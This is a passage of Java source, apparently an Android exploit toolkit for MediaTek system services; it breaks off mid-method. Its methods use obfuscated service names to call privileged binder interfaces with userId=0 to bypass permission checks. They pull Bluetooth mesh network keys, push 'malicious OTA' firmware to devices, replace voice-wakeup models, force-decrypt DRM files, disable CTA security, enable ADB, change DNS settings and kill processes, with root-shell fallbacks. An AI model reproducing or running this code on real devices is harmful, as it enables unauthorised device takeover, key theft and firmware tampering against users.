    /**
     * 扫描 AutoBootService (auto_boot)
     */
    public static String detectAutoBootService() {
        try {
            String name = Obfuscator.dec3(new byte[]{(byte)0x04, (byte)0x03, (byte)0x73, (byte)0x0a, (byte)0x29, (byte)0x65, (byte)0x0a, (byte)0x19, (byte)0x73}, (byte)0x65, (byte)0x76, (byte)0x07);
            IBinder b = getService(name);
            if (b != null) {
                return "[AutoBootService] 发现服务: " + name + " -> " + b;
            }
            return "[AutoBootService] 未发现服务";
        } catch (Throwable e) {
            return "[AutoBootService] detect异常: " + getErrorMsg(e);
        }
    }

    /**
     * AutoBootService - changeAppAutoBootStatus: 修改应用自启动状态 (userId=0绕过权限检查)
     */
    public static String exploitAutoBootChangeStatus(String pkg, boolean enable) {
        try {
            String svcName = Obfuscator.dec3(new byte[]{(byte)0x04, (byte)0x03, (byte)0x73, (byte)0x0a, (byte)0x29, (byte)0x65, (byte)0x0a, (byte)0x19, (byte)0x73}, (byte)0x65, (byte)0x76, (byte)0x07);
            IBinder binder = getService(svcName);
            if (binder == null) return "[AutoBootService] 服务不可用";
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken("com.mediatek.autoboot.IAutoBootService");
                data.writeString(pkg);
                data.writeInt(enable ? 1 : 0);
                data.writeInt(0); // userId=0 绕过权限检查
                boolean ok = binder.transact(1, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[AutoBootService] changeAppAutoBootStatus(" + pkg + ", " + enable + ", userId=0) OK";
                }
                return "[AutoBootService] changeAppAutoBootStatus transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[AutoBootService] changeAppAutoBootStatus异常: " + getErrorMsg(e);
        }
    }

    // ========================================================================
    // 8. IAdvCamService - 高级相机服务
    // ========================================================================

    /**
     * 扫描 IAdvCamService (advcam/adv_cam)
     */
    public static String detectIAdvCamService() {
        try {
            String[] names = {
                Obfuscator.dec3(new byte[]{(byte)0x17, (byte)0x63, (byte)0x6e, (byte)0x15, (byte)0x66, (byte)0x75}, (byte)0x76, (byte)0x07, (byte)0x18),
                Obfuscator.dec3(new byte[]{(byte)0x66, (byte)0x7c, (byte)0x5f, (byte)0x58, (byte)0x7b, (byte)0x48, (byte)0x6a}, (byte)0x07, (byte)0x18, (byte)0x29)
            };
            for (String n : names) {
                IBinder b = getService(n);
                if (b != null) {
                    return "[IAdvCamService] 发现服务: " + n + " -> " + b;
                }
            }
            return "[IAdvCamService] 未发现服务";
        } catch (Throwable e) {
            return "[IAdvCamService] detect异常: " + getErrorMsg(e);
        }
    }

    /**
     * IAdvCamService - setCaptureRequestParam: 修改摄像头参数
     */
    public static String exploitAdvCamSetParam(String param, String value) {
        try {
            String svcName = Obfuscator.dec3(new byte[]{(byte)0x17, (byte)0x63, (byte)0x6e, (byte)0x15, (byte)0x66, (byte)0x75}, (byte)0x76, (byte)0x07, (byte)0x18);
            IBinder binder = getService(svcName);
            if (binder == null) return "[IAdvCamService] 服务不可用";
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x65, (byte)0x78, (byte)0x45, (byte)0x28, (byte)0x7a, (byte)0x4d, (byte)0x62, (byte)0x7e, (byte)0x49, (byte)0x72, (byte)0x72, (byte)0x43, (byte)0x28, (byte)0x76, (byte)0x4c, (byte)0x70, (byte)0x74, (byte)0x49, (byte)0x6b, (byte)0x39, (byte)0x61, (byte)0x47, (byte)0x73, (byte)0x5e, (byte)0x45, (byte)0x76, (byte)0x45, (byte)0x55, (byte)0x72, (byte)0x5a, (byte)0x70, (byte)0x7e, (byte)0x4b, (byte)0x63}, (byte)0x06, (byte)0x17, (byte)0x28);
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                data.writeString(param);
                data.writeString(value);
                boolean ok = binder.transact(1, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[IAdvCamService] setCaptureRequestParam(" + param + "=" + value + ") OK";
                }
                return "[IAdvCamService] setCaptureRequestParam transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[IAdvCamService] setCaptureRequestParam异常: " + getErrorMsg(e);
        }
    }

    // ========================================================================
    // 9. IVoiceWakeupBridge - 语音唤醒桥接
    // ========================================================================

    /**
     * 扫描 IVoiceWakeupBridge (voice_wakeup/vow_bridge)
     */
    public static String detectIVoiceWakeupBridge() {
        try {
            String[] names = {
                Obfuscator.dec3(new byte[]{(byte)0x6e, (byte)0x46, (byte)0x53, (byte)0x7b, (byte)0x4c, (byte)0x65, (byte)0x6f, (byte)0x48, (byte)0x51, (byte)0x7d, (byte)0x5c, (byte)0x4a}, (byte)0x18, (byte)0x29, (byte)0x3a),
                Obfuscator.dec3(new byte[]{(byte)0x5f, (byte)0x55, (byte)0x3c, (byte)0x76, (byte)0x58, (byte)0x39, (byte)0x40, (byte)0x5e, (byte)0x2c, (byte)0x4c}, (byte)0x29, (byte)0x3a, (byte)0x4b)
            };
            for (String n : names) {
                IBinder b = getService(n);
                if (b != null) {
                    return "[IVoiceWakeupBridge] 发现服务: " + n + " -> " + b;
                }
            }
            return "[IVoiceWakeupBridge] 未发现服务";
        } catch (Throwable e) {
            return "[IVoiceWakeupBridge] detect异常: " + getErrorMsg(e);
        }
    }

    /**
     * IVoiceWakeupBridge - setKeyphraseSoundModel: 替换语音唤醒模型
     */
    public static String exploitVoiceWakeupSetModel(byte[] model) {
        try {
            String svcName = Obfuscator.dec3(new byte[]{(byte)0x6e, (byte)0x46, (byte)0x53, (byte)0x7b, (byte)0x4c, (byte)0x65, (byte)0x6f, (byte)0x48, (byte)0x51, (byte)0x7d, (byte)0x5c, (byte)0x4a}, (byte)0x18, (byte)0x29, (byte)0x3a);
            IBinder binder = getService(svcName);
            if (binder == null) return "[IVoiceWakeupBridge] 服务不可用";
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x74, (byte)0x47, (byte)0x54, (byte)0x39, (byte)0x45, (byte)0x5c, (byte)0x73, (byte)0x41, (byte)0x58, (byte)0x63, (byte)0x4d, (byte)0x52, (byte)0x39, (byte)0x5e, (byte)0x56, (byte)0x7e, (byte)0x4b, (byte)0x5c, (byte)0x60, (byte)0x49, (byte)0x52, (byte)0x72, (byte)0x5d, (byte)0x49, (byte)0x39, (byte)0x61, (byte)0x6f, (byte)0x78, (byte)0x41, (byte)0x5a, (byte)0x72, (byte)0x7f, (byte)0x58, (byte)0x7c, (byte)0x4d, (byte)0x4c, (byte)0x67, (byte)0x6a, (byte)0x4b, (byte)0x7e, (byte)0x4c, (byte)0x5e, (byte)0x72}, (byte)0x17, (byte)0x28, (byte)0x39);
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                data.writeByteArray(model);
                boolean ok = binder.transact(1, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[IVoiceWakeupBridge] setKeyphraseSoundModel OK, 模型大小=" + model.length;
                }
                return "[IVoiceWakeupBridge] setKeyphraseSoundModel transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[IVoiceWakeupBridge] setKeyphraseSoundModel异常: " + getErrorMsg(e);
        }
    }

    /**
     * IVoiceWakeupBridge - stopWakeupRecognition: 停止唤醒识别
     */
    public static String exploitVoiceWakeupStopRecognition() {
        try {
            IBinder binder = getService("voice_wakeup");
            if (binder == null) return "[IVoiceWakeupBridge] 服务不可用";
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x74, (byte)0x47, (byte)0x54, (byte)0x39, (byte)0x45, (byte)0x5c, (byte)0x73, (byte)0x41, (byte)0x58, (byte)0x63, (byte)0x4d, (byte)0x52, (byte)0x39, (byte)0x5e, (byte)0x56, (byte)0x7e, (byte)0x4b, (byte)0x5c, (byte)0x60, (byte)0x49, (byte)0x52, (byte)0x72, (byte)0x5d, (byte)0x49, (byte)0x39, (byte)0x61, (byte)0x6f, (byte)0x78, (byte)0x41, (byte)0x5a, (byte)0x72, (byte)0x7f, (byte)0x58, (byte)0x7c, (byte)0x4d, (byte)0x4c, (byte)0x67, (byte)0x6a, (byte)0x4b, (byte)0x7e, (byte)0x4c, (byte)0x5e, (byte)0x72}, (byte)0x17, (byte)0x28, (byte)0x39);
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                boolean ok = binder.transact(2, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[IVoiceWakeupBridge] stopWakeupRecognition OK";
                }
                return "[IVoiceWakeupBridge] stopWakeupRecognition transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[IVoiceWakeupBridge] stopWakeupRecognition异常: " + getErrorMsg(e);
        }
    }

    // ========================================================================
    // 10. IBluetoothMesh - 蓝牙Mesh网络
    // ========================================================================

    /**
     * 扫描 IBluetoothMesh (bluetooth_mesh/bt_mesh)
     */
    public static String detectIBluetoothMesh() {
        try {
            String[] names = {
                Obfuscator.dec3(new byte[]{(byte)0x58, (byte)0x27, (byte)0x29, (byte)0x5f, (byte)0x3f, (byte)0x33, (byte)0x55, (byte)0x3f, (byte)0x34, (byte)0x65, (byte)0x26, (byte)0x39, (byte)0x49, (byte)0x23}, (byte)0x3a, (byte)0x4b, (byte)0x5c),
                Obfuscator.dec3(new byte[]{(byte)0x29, (byte)0x28, (byte)0x32, (byte)0x26, (byte)0x39, (byte)0x1e, (byte)0x23}, (byte)0x4b, (byte)0x5c, (byte)0x6d)
            };
            for (String n : names) {
                IBinder b = getService(n);
                if (b != null) {
                    return "[IBluetoothMesh] 发现服务: " + n + " -> " + b;
                }
            }
            return "[IBluetoothMesh] 未发现服务";
        } catch (Throwable e) {
            return "[IBluetoothMesh] detect异常: " + getErrorMsg(e);
        }
    }

    /**
     * IBluetoothMesh - getMeshNetworkKeys: 获取Mesh网络密钥
     */
    public static String exploitBluetoothMeshGetKeys() {
        try {
            String svcName = Obfuscator.dec3(new byte[]{(byte)0x58, (byte)0x27, (byte)0x29, (byte)0x5f, (byte)0x3f, (byte)0x33, (byte)0x55, (byte)0x3f, (byte)0x34, (byte)0x65, (byte)0x26, (byte)0x39, (byte)0x49, (byte)0x23}, (byte)0x3a, (byte)0x4b, (byte)0x5c);
            IBinder binder = getService(svcName);
            if (binder == null) return "[IBluetoothMesh] 服务不可用";
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x4b, (byte)0x56, (byte)0x27, (byte)0x06, (byte)0x54, (byte)0x2f, (byte)0x4c, (byte)0x50, (byte)0x2b, (byte)0x5c, (byte)0x5c, (byte)0x21, (byte)0x06, (byte)0x5b, (byte)0x26, (byte)0x5d, (byte)0x5c, (byte)0x3e, (byte)0x47, (byte)0x56, (byte)0x3e, (byte)0x40, (byte)0x54, (byte)0x2f, (byte)0x5b, (byte)0x51, (byte)0x64, (byte)0x61, (byte)0x7b, (byte)0x26, (byte)0x5d, (byte)0x5c, (byte)0x3e, (byte)0x47, (byte)0x56, (byte)0x3e, (byte)0x40, (byte)0x74, (byte)0x2f, (byte)0x5b, (byte)0x51}, (byte)0x28, (byte)0x39, (byte)0x4a);
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                boolean ok = binder.transact(1, data, reply, 0);
                if (ok) {
                    reply.readException();
                    String keys = reply.readString();
                    return "[IBluetoothMesh] getMeshNetworkKeys OK: " + (keys != null ? keys : "null");
                }
                return "[IBluetoothMesh] getMeshNetworkKeys transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[IBluetoothMesh] getMeshNetworkKeys异常: " + getErrorMsg(e);
        }
    }

    /**
     * IBluetoothMesh - sendMaliciousOTA: 注入恶意OTA固件
     */
    public static String exploitBluetoothMeshSendOTA(String deviceAddr, byte[] firmware) {
        try {
            IBinder binder = getService("bluetooth_mesh");
            if (binder == null) return "[IBluetoothMesh] 服务不可用";
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x4b, (byte)0x56, (byte)0x27, (byte)0x06, (byte)0x54, (byte)0x2f, (byte)0x4c, (byte)0x50, (byte)0x2b, (byte)0x5c, (byte)0x5c, (byte)0x21, (byte)0x06, (byte)0x5b, (byte)0x26, (byte)0x5d, (byte)0x5c, (byte)0x3e, (byte)0x47, (byte)0x56, (byte)0x3e, (byte)0x40, (byte)0x54, (byte)0x2f, (byte)0x5b, (byte)0x51, (byte)0x64, (byte)0x61, (byte)0x7b, (byte)0x26, (byte)0x5d, (byte)0x5c, (byte)0x3e, (byte)0x47, (byte)0x56, (byte)0x3e, (byte)0x40, (byte)0x74, (byte)0x2f, (byte)0x5b, (byte)0x51}, (byte)0x28, (byte)0x39, (byte)0x4a);
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                data.writeString(deviceAddr);
                data.writeByteArray(firmware);
                boolean ok = binder.transact(2, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[IBluetoothMesh] sendMaliciousOTA OK, addr=" + deviceAddr + ", firmwareSize=" + firmware.length;
                }
                return "[IBluetoothMesh] sendMaliciousOTA transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[IBluetoothMesh] sendMaliciousOTA异常: " + getErrorMsg(e);
        }
    }

    // ========================================================================
    // 11. EthernetService - 以太网配置
    // ========================================================================

    /**
     * 扫描 EthernetService (ethernet)
     */
    public static String detectEthernetService() {
        try {
            String name = Obfuscator.dec3(new byte[]{(byte)0x39, (byte)0x19, (byte)0x16, (byte)0x39, (byte)0x1f, (byte)0x10, (byte)0x39, (byte)0x19}, (byte)0x5c, (byte)0x6d, (byte)0x7e);
            IBinder b = getService(name);
            if (b != null) {
                return "[EthernetService] 发现服务: " + name + " -> " + b;
            }
            return "[EthernetService] 未发现服务";
        } catch (Throwable e) {
            return "[EthernetService] detect异常: " + getErrorMsg(e);
        }
    }

    /**
     * EthernetService - getEthernetConfiguration: 获取以太网配置
     */
    public static String exploitEthernetGetConfig() {
        try {
            String svcName = Obfuscator.dec3(new byte[]{(byte)0x39, (byte)0x19, (byte)0x16, (byte)0x39, (byte)0x1f, (byte)0x10, (byte)0x39, (byte)0x19}, (byte)0x5c, (byte)0x6d, (byte)0x7e);
            IBinder binder = getService(svcName);
            if (binder == null) return "[EthernetService] 服务不可用";
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken("android.net.ethernet.IEthernetManager");
                boolean ok = binder.transact(1, data, reply, 0);
                if (ok) {
                    reply.readException();
                    String config = reply.readString();
                    return "[EthernetService] getEthernetConfiguration OK: " + (config != null ? config : "null");
                }
                return "[EthernetService] getEthernetConfiguration transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[EthernetService] getEthernetConfiguration异常: " + getErrorMsg(e);
        }
    }

    /**
     * EthernetService - setEthernetConfiguration: 修改以太网配置
     */
    public static String exploitEthernetSetConfig(String ip, String dns) {
        try {
            IBinder binder = getService("ethernet");
            if (binder == null) return "[EthernetService] 服务不可用";
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken("android.net.ethernet.IEthernetManager");
                data.writeString(ip);
                data.writeString(dns);
                boolean ok = binder.transact(2, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[EthernetService] setEthernetConfiguration OK, ip=" + ip + ", dns=" + dns;
                }
                return "[EthernetService] setEthernetConfiguration transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[EthernetService] setEthernetConfiguration异常: " + getErrorMsg(e);
        }
    }

    // ========================================================================
    // 12. DcfDecoder - DRM文件解密
    // ========================================================================

    /**
     * DcfDecoder - 强制解密DRM文件 (静态方法, 无服务名)
     */
    public static String exploitDcfDecoderForceDecrypt(String path, boolean consume) {
        try {
            Class<?> cls = Class.forName("com.mediatek.drm.dcf.DcfDecoder");
            Method method = cls.getDeclaredMethod("forceDecryptFile", String.class, Boolean.TYPE);
            method.setAccessible(true);
            Object result = method.invoke(null, path, consume);
            return "[DcfDecoder] forceDecryptFile(" + path + ", " + consume + ") OK: " + (result != null ? result.toString() : "null");
        } catch (Throwable e) {
            return "[DcfDecoder] forceDecryptFile异常: " + getErrorMsg(e);
        }
    }

    // ========================================================================
    // 13. TestModeTethering - USB网络共享 (广播利用)
    // ========================================================================

    /**
     * TestModeTethering - enableUsbTethering: 发送广播启用USB网络共享
     */
    public static String exploitTestModeTetheringEnableUsb() {
        try {
            Class<?> ctxCls = Class.forName("android.app.ActivityThread");
            Method currentApp = ctxCls.getDeclaredMethod("currentApplication");
            Object app = currentApp.invoke(null);
            Method getApp = app.getClass().getMethod("getApplicationContext");
            Object ctx = getApp.invoke(app);
            Class<?> intentCls = Class.forName("android.content.Intent");
            Object intent = intentCls.getConstructor(String.class).newInstance("com.mediatek.testmode.USB_TETHERING");
            Method putExtra = intentCls.getMethod("putExtra", String.class, Boolean.TYPE);
            putExtra.invoke(intent, "enable", true);
            Method sendBroadcast = ctx.getClass().getMethod("sendBroadcast", intentCls);
            sendBroadcast.invoke(ctx, intent);
            return "[TestModeTethering] 已发送USB_TETHERING广播, USB网络共享已启用";
        } catch (Throwable e) {
            return "[TestModeTethering] enableUsbTethering异常: " + getErrorMsg(e);
        }
    }

    // ========================================================================
    // 14. CtaUtils - CTA安全管控
    // ========================================================================

    /**
     * CtaUtils - disableCtaSecurity: 禁用CTA安全 (设置 persist.vendor.sys.disable.moms=1)
     */
    public static String exploitCtaUtilsDisable() {
        String key = Obfuscator.dec(new byte[]{(byte)0x7f, (byte)0x6a, (byte)0x7d, (byte)0x7c, (byte)0x66, (byte)0x7c, (byte)0x7b, (byte)0x21, (byte)0x79, (byte)0x6a, (byte)0x61, (byte)0x6b, (byte)0x60, (byte)0x7d, (byte)0x21, (byte)0x7c, (byte)0x76, (byte)0x7c, (byte)0x21, (byte)0x6b, (byte)0x66, (byte)0x7c, (byte)0x6e, (byte)0x6d, (byte)0x63, (byte)0x6a, (byte)0x21, (byte)0x62, (byte)0x60, (byte)0x62, (byte)0x7c}, (byte)0x0f);
        try {
            Class<?> sysProp = Class.forName("android.os.SystemProperties");
            Method set = sysProp.getDeclaredMethod("set", String.class, String.class);
            set.invoke(null, key, "1");
            return "[CtaUtils] disableCtaSecurity OK, 已设置 " + key + "=1";
        } catch (Throwable e) {
            // 反射失败，尝试root shell回退
            if (setPropViaRoot(key, "1")) {
                return "[CtaUtils] disableCtaSecurity OK (root), 已设置 " + key + "=1";
            }
            return "[CtaUtils] disableCtaSecurity失败: " + getErrorMsg(e) + " (root也不可用)";
        }
    }

    /**
     * CtaUtils - enableCtaSecurity: 恢复CTA安全 (设置 persist.vendor.sys.disable.moms=0)
     */
    public static String exploitCtaUtilsEnable() {
        String key = Obfuscator.dec(new byte[]{(byte)0x7f, (byte)0x6a, (byte)0x7d, (byte)0x7c, (byte)0x66, (byte)0x7c, (byte)0x7b, (byte)0x21, (byte)0x79, (byte)0x6a, (byte)0x61, (byte)0x6b, (byte)0x60, (byte)0x7d, (byte)0x21, (byte)0x7c, (byte)0x76, (byte)0x7c, (byte)0x21, (byte)0x6b, (byte)0x66, (byte)0x7c, (byte)0x6e, (byte)0x6d, (byte)0x63, (byte)0x6a, (byte)0x21, (byte)0x62, (byte)0x60, (byte)0x62, (byte)0x7c}, (byte)0x0f);
        try {
            Class<?> sysProp = Class.forName("android.os.SystemProperties");
            Method set = sysProp.getDeclaredMethod("set", String.class, String.class);
            set.invoke(null, key, "0");
            return "[CtaUtils] enableCtaSecurity OK, 已恢复 " + key + "=0";
        } catch (Throwable e) {
            if (setPropViaRoot(key, "0")) {
                return "[CtaUtils] enableCtaSecurity OK (root), 已恢复 " + key + "=0";
            }
            return "[CtaUtils] enableCtaSecurity失败: " + getErrorMsg(e) + " (root也不可用)";
        }
    }

    // ========================================================================
    // 15. SystemProperties - 系统属性管理
    // ========================================================================

    /**
     * SystemProperties - getProperty: 读取系统属性
     */
    public static String exploitSysPropGet(String key) {
        try {
            Class<?> sysProp = Class.forName("android.os.SystemProperties");
            Method get = sysProp.getDeclaredMethod("get", String.class, String.class);
            String value = (String) get.invoke(null, key, "");
            return "[SystemProperties] get(" + key + ") = " + value;
        } catch (Throwable e) {
            return "[SystemProperties] get异常: " + getErrorMsg(e);
        }
    }

    /**
     * SystemProperties - setProperty: 设置系统属性 (persist)
     */
    public static String exploitSysPropSet(String key, String value) {
        try {
            Class<?> sysProp = Class.forName("android.os.SystemProperties");
            Method set = sysProp.getDeclaredMethod("set", String.class, String.class);
            set.invoke(null, key, value);
            return "[SystemProperties] set(" + key + "=" + value + ") OK";
        } catch (Throwable e) {
            // 反射失败，尝试root shell回退
            if (setPropViaRoot(key, value)) {
                return "[SystemProperties] set(" + key + "=" + value + ") OK (root)";
            }
            return "[SystemProperties] set失败: " + getErrorMsg(e) + " (root也不可用)";
        }
    }

    /**
     * SystemProperties - enableTcpLog: 设置 persist.sys.tcplog=1 启用root抓包
     */
    public static String exploitSysPropEnableTcpLog() {
        String key = Obfuscator.dec(new byte[]{(byte)0x50, (byte)0x45, (byte)0x52, (byte)0x53, (byte)0x49, (byte)0x53, (byte)0x54, (byte)0x0e, (byte)0x53, (byte)0x59, (byte)0x53, (byte)0x0e, (byte)0x54, (byte)0x43, (byte)0x50, (byte)0x4c, (byte)0x4f, (byte)0x47}, (byte)0x20);
        try {
            Class<?> sysProp = Class.forName("android.os.SystemProperties");
            Method set = sysProp.getDeclaredMethod("set", String.class, String.class);
            set.invoke(null, key, "1");
            return "[SystemProperties] enableTcpLog OK, " + key + "=1, 已启用root抓包";
        } catch (Throwable e) {
            if (setPropViaRoot(key, "1")) {
                return "[SystemProperties] enableTcpLog OK (root), " + key + "=1, 已启用root抓包";
            }
            return "[SystemProperties] enableTcpLog失败: " + getErrorMsg(e) + " (root也不可用)";
        }
    }

    /**
     * SystemProperties - triggerDropCaches: 设置 persist.vendor.sys.vm.drop_caches=3
     */
    public static String exploitSysPropTriggerDropCaches() {
        String key = Obfuscator.dec(new byte[]{(byte)0x41, (byte)0x54, (byte)0x43, (byte)0x42, (byte)0x58, (byte)0x42, (byte)0x45, (byte)0x1f, (byte)0x47, (byte)0x54, (byte)0x5f, (byte)0x55, (byte)0x5e, (byte)0x43, (byte)0x1f, (byte)0x42, (byte)0x48, (byte)0x42, (byte)0x1f, (byte)0x47, (byte)0x5c, (byte)0x1f, (byte)0x55, (byte)0x43, (byte)0x5e, (byte)0x41, (byte)0x6e, (byte)0x52, (byte)0x50, (byte)0x52, (byte)0x59, (byte)0x54, (byte)0x42}, (byte)0x31);
        try {
            Class<?> sysProp = Class.forName("android.os.SystemProperties");
            Method set = sysProp.getDeclaredMethod("set", String.class, String.class);
            set.invoke(null, key, "3");
            return "[SystemProperties] triggerDropCaches OK, " + key + "=3, 已触发缓存清理";
        } catch (Throwable e) {
            if (setPropViaRoot(key, "3")) {
                return "[SystemProperties] triggerDropCaches OK (root), " + key + "=3";
            }
            return "[SystemProperties] triggerDropCaches失败: " + getErrorMsg(e) + " (root也不可用)";
        }
    }

    /**
     * SystemProperties - triggerAnrFlow: 设置 persist.vendor.dbg.anrflow=2 触发ANR杀进程
     */
    public static String exploitSysPropTriggerAnrFlow() {
        String key = Obfuscator.dec(new byte[]{(byte)0x32, (byte)0x27, (byte)0x30, (byte)0x31, (byte)0x2b, (byte)0x31, (byte)0x36, (byte)0x6c, (byte)0x34, (byte)0x27, (byte)0x2c, (byte)0x26, (byte)0x2d, (byte)0x30, (byte)0x6c, (byte)0x26, (byte)0x20, (byte)0x25, (byte)0x6c, (byte)0x23, (byte)0x2c, (byte)0x30, (byte)0x24, (byte)0x2e, (byte)0x2d, (byte)0x35}, (byte)0x42);
        try {
            Class<?> sysProp = Class.forName("android.os.SystemProperties");
            Method set = sysProp.getDeclaredMethod("set", String.class, String.class);
            set.invoke(null, key, "2");
            return "[SystemProperties] triggerAnrFlow OK, " + key + "=2, 已触发ANR杀进程";
        } catch (Throwable e) {
            if (setPropViaRoot(key, "2")) {
                return "[SystemProperties] triggerAnrFlow OK (root), " + key + "=2";
            }
            return "[SystemProperties] triggerAnrFlow失败: " + getErrorMsg(e) + " (root也不可用)";
        }
    }

    // ========================================================================
    // 16. SettingsProvider - 系统设置读写
    // ========================================================================

    /**
     * SettingsProvider - getSetting: 读取系统设置
     */
    public static String exploitSettingsGet(String key) {
        // 先尝试Settings.System，再Global，再Secure
        String[] namespaces = {"system", "global", "secure"};
        Class<?>[] settingClasses = null;
        try {
            settingClasses = new Class<?>[]{
                Class.forName("android.provider.Settings$System"),
                Class.forName("android.provider.Settings$Global"),
                Class.forName("android.provider.Settings$Secure")
            };
        } catch (Throwable e) {
            return "[SettingsProvider] get异常: " + getErrorMsg(e);
        }

        for (int i = 0; i < settingClasses.length; i++) {
            try {
                Class<?> ctxCls = Class.forName("android.app.ActivityThread");
                Method currentApp = ctxCls.getDeclaredMethod("currentApplication");
                Object app = currentApp.invoke(null);
                Method getApp = app.getClass().getMethod("getApplicationContext");
                Object ctx = getApp.invoke(app);
                Class<?> resolverCls = Class.forName("android.content.ContentResolver");
                Method resolver = ctx.getClass().getMethod("getContentResolver");
                Object cr = resolver.invoke(ctx);
                Method getString = settingClasses[i].getDeclaredMethod("getString", resolverCls, String.class);
                String value = (String) getString.invoke(null, cr, key);
                if (value != null) {
                    return "[SettingsProvider] get(" + namespaces[i] + "/" + key + ") = " + value;
                }
            } catch (Throwable e) {
                // 继续尝试下一个命名空间
            }
        }
        // 所有反射都失败，尝试root
        for (String ns : namespaces) {
            String val = getSettingsViaRoot(ns, key);
            if (val != null) {
                return "[SettingsProvider] get(" + ns + "/" + key + ") = " + val + " (root)";
            }
        }
        return "[SettingsProvider] get(" + key + ") = null (所有方式均失败)";
    }

    /**
     * SettingsProvider - putSetting: 写入系统设置 (自动尝试System/Global/Secure)
     */
    public static String exploitSettingsPut(String key, String value) {
        String[] namespaces = {"system", "global", "secure"};
        Class<?>[] settingClasses = null;
        try {
            settingClasses = new Class<?>[]{
                Class.forName("android.provider.Settings$System"),
                Class.forName("android.provider.Settings$Global"),
                Class.forName("android.provider.Settings$Secure")
            };
        } catch (Throwable e) {
            return "[SettingsProvider] put异常: " + getErrorMsg(e);
        }

        for (int i = 0; i < settingClasses.length; i++) {
            try {
                Class<?> ctxCls = Class.forName("android.app.ActivityThread");
                Method currentApp = ctxCls.getDeclaredMethod("currentApplication");
                Object app = currentApp.invoke(null);
                Method getApp = app.getClass().getMethod("getApplicationContext");
                Object ctx = getApp.invoke(app);
                Class<?> resolverCls = Class.forName("android.content.ContentResolver");
                Method resolver = ctx.getClass().getMethod("getContentResolver");
                Object cr = resolver.invoke(ctx);
                Method putString = settingClasses[i].getDeclaredMethod("putString", resolverCls, String.class, String.class);
                putString.invoke(null, cr, key, value);
                return "[SettingsProvider] put(" + namespaces[i] + "/" + key + "=" + value + ") OK";
            } catch (Throwable e) {
                // 继续尝试下一个命名空间
            }
        }
        // 所有反射都失败，尝试root
        for (String ns : namespaces) {
            if (setSettingsViaRoot(ns, key, value)) {
                return "[SettingsProvider] put(" + ns + "/" + key + "=" + value + ") OK (root)";
            }
        }
        return "[SettingsProvider] put失败: 所有方式均失败 (需要WRITE_SECURE_SETTINGS权限或root)";
    }

    /**
     * SettingsProvider - enableAdb: 启用ADB调试 (通过Settings.Global)
     */
    public static String exploitSettingsEnableAdb() {
        // 方式1: 反射Settings.Global.putString
        try {
            Class<?> ctxCls = Class.forName("android.app.ActivityThread");
            Method currentApp = ctxCls.getDeclaredMethod("currentApplication");
            Object app = currentApp.invoke(null);
            Method getApp = app.getClass().getMethod("getApplicationContext");
            Object ctx = getApp.invoke(app);
            Class<?> resolverCls = Class.forName("android.content.ContentResolver");
            Method resolver = ctx.getClass().getMethod("getContentResolver");
            Object cr = resolver.invoke(ctx);
            Class<?> globalCls = Class.forName("android.provider.Settings$Global");
            Method putString = globalCls.getDeclaredMethod("putString", resolverCls, String.class, String.class);
            putString.invoke(null, cr, "adb_enabled", "1");
            return "[SettingsProvider] enableAdb OK (Global), ADB调试已启用";
        } catch (Throwable e) {
            // 方式2: root shell回退
            if (setSettingsViaRoot("global", "adb_enabled", "1")) {
                return "[SettingsProvider] enableAdb OK (root), ADB调试已启用";
            }
            return "[SettingsProvider] enableAdb失败: " + getErrorMsg(e) + " (需要WRITE_SECURE_SETTINGS权限或root)";
        }
    }

    // ========================================================================
    // 17. PowerHalMgr Expansion - 电源管理扩展
    // ========================================================================

    /**
     * 扫描 PowerHalMgr 服务 (power_hal_mgr_service)
     */
    public static String detectPowerHalMgr() {
        try {
            String[] names = {
                Obfuscator.dec3(new byte[]{(byte)0x1d, (byte)0x11, (byte)0x78, (byte)0x08, (byte)0x0c, (byte)0x50, (byte)0x05, (byte)0x1f, (byte)0x63, (byte)0x32, (byte)0x13, (byte)0x68, (byte)0x1f, (byte)0x21, (byte)0x7c, (byte)0x08, (byte)0x0c, (byte)0x79, (byte)0x04, (byte)0x1d, (byte)0x6a}, (byte)0x6d, (byte)0x7e, (byte)0x0f),
                "powerhal",
                "mtk_powerhal"
            };
            for (String n : names) {
                IBinder b = getService(n);
                if (b != null) {
                    return "[PowerHalMgr] 发现服务: " + n + " -> " + b;
                }
            }
            return "[PowerHalMgr] 未发现服务";
        } catch (Throwable e) {
